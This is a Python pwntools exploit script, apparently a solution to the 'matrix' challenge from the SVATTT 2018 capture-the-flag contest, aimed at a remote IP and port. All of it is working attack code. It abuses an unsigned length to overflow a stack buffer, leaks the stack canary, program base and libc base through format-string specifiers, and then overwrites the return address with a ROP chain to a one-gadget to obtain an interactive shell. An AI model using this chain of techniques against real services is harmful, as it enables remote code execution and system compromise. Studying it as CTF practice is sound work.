#SVATTT2018{I_donot_create_ctf_challenge_anymore}
#Bug stack overflow
from pwn import *

#r = process('./matrix')
r = remote("171.244.141.82", 4002)

r.recvuntil("3.quit\n>")
r.sendline("4")
r.recvuntil("3.quit\n>")
r.sendline("2")
r.recvuntil("Enter length of password:")
r.sendline(str(0xffffffff)+"a")
r.sendline("a"*64)
r.recvuntil("Wrong password: ")
r.recvuntil("a"*64)
tmp = r.recv(6).ljust(8, "\x00")
stack = u64(tmp)
log.info("stack: %#x" %stack)

r.recvuntil("3.quit\n>")
r.sendline("2")
r.recvuntil("Enter length of password:")
r.sendline(str(0xffffffff)+"a")
payload = "%123$p--%125$p--%129$p".ljust(64, "a")
payload += p16((stack&0xffff)+93)
#raw_input("?")
r.sendline(payload)
tmp = r.recvuntil("aaaaa")[:-5].split("--")
canary = int(tmp[0], 16)
base = int(tmp[1], 16) - 0x1481
libcbase = int(tmp[2], 16) - 0x020830
log.info("canary: %#x" %canary)
log.info("base: %#x" %base)
log.info("libcbase: %#x" %libcbase)
onegadget = libcbase + 0xf1147
log.info("onegadget: %#x" %onegadget)
ret = base + 0x1483
log.info("ret: %#x" %ret)

r.recvuntil("3.quit\n>")
r.sendline("2")
r.recvuntil("Enter length of password:")
r.sendline(str(0xffffffff)+"a")

payload = "a"*64
payload += p64(base+50)
payload += "a"*0x1f
payload += p64(canary)
payload += p64(canary)
payload += p64(ret)*4
payload += p64(onegadget)
r.sendline(payload)

r.interactive()
